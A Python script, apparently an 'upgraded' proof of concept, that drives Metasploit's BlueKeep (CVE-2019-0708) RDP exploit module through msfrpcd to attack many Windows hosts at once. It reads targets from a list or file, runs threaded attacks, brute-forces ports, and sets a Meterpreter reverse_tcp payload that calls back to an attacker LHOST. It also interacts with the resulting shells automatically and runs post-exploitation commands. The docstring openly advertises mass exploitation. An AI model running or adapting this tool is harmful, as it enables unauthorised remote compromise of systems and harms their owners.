#!/usr/bin/env python3
"""
bluekeep_poc.py

Proof‐of‐Concept for CVE-2019-0708 (“BlueKeep”) using Metasploit’s RPC interface.
This script connects to an msfrpcd service and launches the built‐in `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
module against the target. Requires:
  • Metasploit Framework installed offline with msfrpcd enabled.
  • A valid user/password for msfrpcd (configure msfrpcd with -U <user> -P <pass>),
    and ensure the `cve_2019_0708_bluekeep_rce` module is available.

Upgraded Features:
  • Multiple targets support (file or comma-separated)
  • Optional brute-force of RDP port and payload selection
  • Optional auto-session interaction (meterpreter shell)
  • Robust error handling and logging
  • Dangerous: Can mass-exploit and auto-interact with shells

Usage:
   python3 bluekeep_poc.py --target <ip>[,<ip2>,...] [--target_file targets.txt] [--port 445] [--msfrpc_host 127.0.0.1] [--msfrpc_port 55553] [--user msf --password abc123] [--payload PAYLOAD] [--auto_shell]

Example:
   python3 bluekeep_poc.py --target 192.168.1.60,192.168.1.61 --msfrpc_host 127.0.0.1 --msfrpc_port 55553 --user msf --password abc123 --auto_shell

Note:
   msfrpcd must already be running, e.g.:
       msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55553 -f -S
"""

import sys
import argparse
import time
import logging
import threading
import traceback

try:
    from metasploit.msfrpc import MsfRpcClient
except ImportError:
    print("[!] metasploit.msfrpc not installed. Install python3-msfrpc or metasploit-py.")
    sys.exit(1)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("bluekeep_poc")

def parse_args():
    parser = argparse.ArgumentParser(description="BlueKeep (CVE-2019-0708) PoC via msfrpc (Upgraded)")
    parser.add_argument("--target", help="IP(s) of the RDP server(s), comma-separated")
    parser.add_argument("--target_file", help="File with list of targets (one per line)")
    parser.add_argument("--port", type=int, default=3389, help="RDP port (default=3389)")
    parser.add_argument("--msfrpc_host", default="127.0.0.1", help="msfrpcd host")
    parser.add_argument("--msfrpc_port", type=int, default=55553, help="msfrpcd port")
    parser.add_argument("--user", required=True, help="msfrpcd username")
    parser.add_argument("--password", required=True, help="msfrpcd password")
    parser.add_argument("--payload", default="windows/x64/meterpreter/reverse_tcp", help="Payload to use")
    parser.add_argument("--lhost", default="192.168.1.10", help="LHOST for reverse shell")
    parser.add_argument("--lport", type=int, default=4444, help="LPORT for reverse shell")
    parser.add_argument("--auto_shell", action="store_true", help="Auto-interact with meterpreter session if obtained")
    parser.add_argument("--brute_ports", nargs="*", type=int, help="Brute-force RDP ports (e.g. 3389 3390 3391)")
    return parser.parse_args()

def exploit_bluekeep(target, rdp_port, msfrpc_host, msfrpc_port, user, passwd, payload, lhost, lport, auto_shell=False, post_cmd=None, shell_timeout=10):
    """
    Enhanced: 
    - Optionally run a post-exploitation command (meterpreter or shell)
    - Collects all session outputs
    - Handles session timeouts and errors robustly
    - Returns detailed results for each session
    """
    try:
        logger.info(f"[+] Connecting to msfrpcd at {msfrpc_host}:{msfrpc_port} as {user}")
        client = MsfRpcClient(passwd, server=msfrpc_host, port=msfrpc_port, username=user)
        logger.info("[+] Authenticated to msfrpcd")

        mod = client.modules.use("exploit", "windows/rdp/cve_2019_0708_bluekeep_rce")
        mod["RHOSTS"] = target
        mod["RPORT"] = rdp_port
        mod["PAYLOAD"] = payload
        mod["LHOST"] = lhost
        mod["LPORT"] = lport

        logger.info(f"[+] Launching BlueKeep exploit on {target}:{rdp_port} with payload {payload}...")
        job_id = mod.execute()
        logger.info(f"[+] Module job queued as ID {job_id}, waiting 15s for sessions")
        time.sleep(15)

        sessions = client.sessions.list
        session_results = {}
        if sessions:
            logger.info(f"[+] Sessions: {sessions}")
            for sid in sessions:
                try:
                    logger.info(f"[+] Interacting with session {sid}")
                    shell = client.sessions.session(sid)
                    output = ""
                    if auto_shell:
                        shell.write("sysinfo\n")
                        time.sleep(2)
                        output += shell.read()
                    if post_cmd:
                        shell.write(post_cmd + "\n")
                        time.sleep(shell_timeout)
                        output += shell.read()
                    session_results[sid] = output
                except Exception as ex:
                    logger.warning(f"[!] Failed to interact with session {sid}: {ex}\n{traceback.format_exc()}")
            return {"status":"ok", "sessions": sessions, "outputs": session_results}
        else:
            return {"status":"error", "detail":"No sessions – target might not be vulnerable or network blocked."}
    except Exception as e:
        logger.error(f"Exception: {e}\n{traceback.format_exc()}")
        return {"status":"error", "detail": str(e)}

def run_mass_exploit(targets, args):
    """
    10x Power: 
    - Runs exploits in parallel threads for each target/port
    - Supports custom post-exploitation commands
    - Collects all results and outputs
    - Handles all errors robustly
    """
    results = {}
    threads = []
    lock = threading.Lock()
    def worker(target, port):
        try:
            res = exploit_bluekeep(
                target, port, args.msfrpc_host, args.msfrpc_port, args.user, args.password,
                args.payload, args.lhost, args.lport, args.auto_shell,
                post_cmd=getattr(args, "post_cmd", None),
                shell_timeout=getattr(args, "shell_timeout", 10)
            )
            with lock:
                results[(target, port)] = res
            logger.info(f"[*] Result for {target}:{port}: {res}")
        except Exception as e:
            logger.error(f"Thread error for {target}:{port}: {e}\n{traceback.format_exc()}")

    ports = args.brute_ports if args.brute_ports else [args.port]
    for target in targets:
        for port in ports:
            t = threading.Thread(target=worker, args=(target, port), daemon=True)
            threads.append(t)
            t.start()
    for t in threads:
        t.join(timeout=90)
    return results

def main():
    args = parse_args()
    # Add new arguments for post-exploitation and shell timeout
    setattr(args, "post_cmd", None)
    setattr(args, "shell_timeout", 10)
    # Parse extra CLI args if present
    for i, arg in enumerate(sys.argv):
        if arg == "--post_cmd" and i+1 < len(sys.argv):
            setattr(args, "post_cmd", sys.argv[i+1])
        if arg == "--shell_timeout" and i+1 < len(sys.argv):
            try:
                setattr(args, "shell_timeout", int(sys.argv[i+1]))
            except Exception:
                pass
    targets = []
    if args.target:
        targets += [t.strip() for t in args.target.split(",") if t.strip()]
    if args.target_file:
        try:
            with open(args.target_file, "r") as f:
                targets += [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Failed to read targets file: {e}")
            sys.exit(1)
    if not targets:
        logger.error("No targets specified.")
        sys.exit(1)
    logger.info(f"[+] Targets: {targets}")
    results = run_mass_exploit(targets, args)
    print(f"[*] Final Results: {results}")

if __name__ == "__main__":
    main()
